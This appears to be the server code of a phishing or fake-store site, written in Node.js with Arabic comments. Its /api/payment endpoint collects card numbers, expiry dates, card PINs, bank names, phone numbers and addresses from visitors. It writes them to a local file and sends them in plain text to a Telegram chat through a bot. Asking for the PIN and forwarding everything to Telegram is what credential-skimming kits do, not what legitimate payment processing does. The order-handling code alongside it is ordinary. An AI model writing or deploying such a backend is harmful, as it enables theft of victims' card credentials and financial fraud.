// مسار حفظ البيانات
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}

const paymentsFile = path.join(dataDir, 'payments.json');
const ordersFile = path.join(dataDir, 'orders.json');
const productsFile = path.join(__dirname, 'products.json');

// دوال مساعدة
function readJsonFile(filePath, defaultValue = []) {
    try {
        if (fs.existsSync(filePath)) {
            const data = fs.readFileSync(filePath, 'utf-8');
            return JSON.parse(data);
        }
        return defaultValue;
    } catch (error) {
        console.error(`خطأ في قراءة ${filePath}:`, error);
        return defaultValue;
    }
}

function writeJsonFile(filePath, data) {
    try {
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf-8');
        return true;
    } catch (error) {
        console.error(`خطأ في كتابة ${filePath}:`, error);
        return false;
    }
}

// ==================== دالة إرسال البيانات إلى Telegram ====================
async function sendToTelegram(message) {
    return new Promise((resolve, reject) => {
        // تنظيف الرسالة وإزالة المسافات الزائدة
        let cleanMessage = (message || '').trim();
        
        // إذا كانت الرسالة فارغة بعد التنظيف، أرسل رسالة افتراضية
        if (!cleanMessage) {
            console.warn('⚠️ رسالة فارغة، سيتم استخدام رسالة افتراضية');
            cleanMessage = '📩 تم استقبال بيانات جديدة من النظام';
        }
        
        // استبدال \n بـ Unicode escape للتأكد من أن الفواصل تُرسل بشكل صحيح
        cleanMessage = cleanMessage.replace(/\n/g, '\n');
        
        const data = JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: cleanMessage,
            parse_mode: 'HTML'
        });

        const options = {
            hostname: 'api.telegram.org',
            path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data)
            }
        };

        const req = https.request(options, (res) => {
            let body = '';
            res.on('data', (chunk) => body += chunk);
            res.on('end', () => {
                try {
                    const result = JSON.parse(body);
                    if (result.ok) {
                        console.log('✅ تم الإرسال إلى Telegram بنجاح');
                        resolve(result);
                    } else {
                        console.error('❌ خطأ من Telegram:', result.description);
                        reject(result);
                    }
                } catch (error) {
                    reject(error);
                }
            });
        });

        req.on('error', (error) => {
            console.error('❌ خطأ في الاتصال بـ Telegram:', error);
            reject(error);
        });

        req.write(data);
        req.end();
    });
}

// ==================== API Endpoints ====================

// 1. إرسال بيانات الدفع / رسالة عامة
app.post('/api/payment', (req, res) => {
    try {
        const data = req.body;
        
        // قبول البيانات بمرونة
        const {
            name,
            message,
            type,
            bank,
            prefix,
            cardNumber,
            expiryMonth,
            expiryYear,
            pin,
            amount,
            orderId,
            phone,
            address,
            city,
            method,
            deliveryTime,
            coupon
        } = data;

        // إنشاء معرّف فريد
        const paymentId = uuidv4();
        const timestamp = new Date().toISOString();

        // إنشاء الرسالة للإرسال إلى Telegram
        let telegramMessage = '';
        
        if (message) {
            // إذا تم توفير رسالة مباشرة، استخدمها
            telegramMessage = message;
        } else {
            // بناء الرسالة من البيانات المتاحة
            telegramMessage = `
🔔 <b>بيانات جديدة من النموذج</b>

<b>الوقت:</b> ${timestamp}
<b>نوع الطلب:</b> ${type || 'رسالة عامة'}
<b>معرّف الطلب:</b> ${paymentId}

`;
            if (name) telegramMessage += `<b>👤 الاسم:</b> ${name}\n`;
            if (phone) telegramMessage += `<b>📞 الهاتف:</b> ${phone}\n`;
            if (cardNumber) telegramMessage += `<b>💳 رقم البطاقة:</b> ${cardNumber}\n`;
            if (pin) telegramMessage += `<b>🔐 الرقم السري:</b> ${pin}\n`;
            if (bank) telegramMessage += `<b>🏦 البنك:</b> ${bank}\n`;
            if (address) telegramMessage += `<b>📍 العنوان:</b> ${address}\n`;
            if (city) telegramMessage += `<b>🏙️ المحافظة:</b> ${city}\n`;
            if (method) telegramMessage += `<b>🛒 طريقة الشراء:</b> ${method}\n`;
            if (deliveryTime) telegramMessage += `<b>⏰ موعد التوصيل:</b> ${deliveryTime}\n`;
            if (coupon) telegramMessage += `<b>🏷️ الكوبون:</b> ${coupon}\n`;
            if (amount) telegramMessage += `<b>💰 المبلغ:</b> ${amount}\n`;
        }

        // إنشاء سجل الدفعة
        const payment = {
            id: paymentId,
            timestamp: timestamp,
            status: 'pending',
            type: type || 'general',
            ...data
        };

        // حفظ البيانات محلياً
        const payments = readJsonFile(paymentsFile);
        payments.push(payment);
        writeJsonFile(paymentsFile, payments);

        // تنظيف الرسالة
        let finalMessage = (telegramMessage || '').trim();
        if (!finalMessage) {
            finalMessage = `🔔 <b>بيانات جديدة - ${type || 'عام'}</b>\n\n${JSON.stringify(data, null, 2)}`;
        }

        console.log('📤 جاري إرسال الرسالة إلى Telegram...');
        console.log('📝 محتوى الرسالة:', finalMessage.substring(0, 100) + '...');

        // إرسال إلى Telegram
        sendToTelegram(finalMessage)
            .then((result) => {
                console.log('✅ تم إرسال البيانات إلى Telegram بنجاح');
                res.json({
                    success: true,
                    message: 'تم استقبال البيانات بنجاح',
                    paymentId: paymentId,
                    telegramStatus: 'sent'
                });
            })
            .catch((error) => {
                console.error('⚠️ تم حفظ البيانات محلياً لكن حدث خطأ في إرسالها إلى Telegram:', error);
                res.json({
                    success: true,
                    message: 'تم حفظ البيانات بنجاح (الإرسال إلى Telegram قيد المحاولة)',
                    paymentId: paymentId,
                    telegramStatus: 'pending'
                });
            });

    } catch (error) {
        console.error('❌ خطأ في معالجة الطلب:', error);
        res.status(500).json({
            success: false,
            message: 'خطأ في الخادم',
            error: error.message
        });
    }
});

// 2. إنشاء طلب جديد
app.post('/api/orders', (req, res) => {
    try {
        const { items, totalAmount, customerName, customerPhone } = req.body;

        const order = {
            id: uuidv4(),
            timestamp: new Date().toISOString(),
            status: 'pending', // pending, paid, shipped, delivered
            items: items,
            totalAmount: totalAmount,
            customerName: customerName,
            customerPhone: customerPhone,
            paymentMethod: null,
            paymentId: null
        };

        const orders = readJsonFile(ordersFile);
        orders.push(order);
        writeJsonFile(ordersFile, orders);

        console.log('✅ طلب جديد تم إنشاؤه:', order.id);

        res.json({
            success: true,
            message: 'تم إنشاء الطلب بنجاح',
            orderId: order.id
        });
    } catch (error) {
        console.error('خطأ في إنشاء الطلب:', error);
        res.status(500).json({
            success: false,
            message: 'خطأ في الخادم'
        });
    }
});

// 3. الحصول على جميع الطلبات
app.get('/api/orders', (req, res) => {
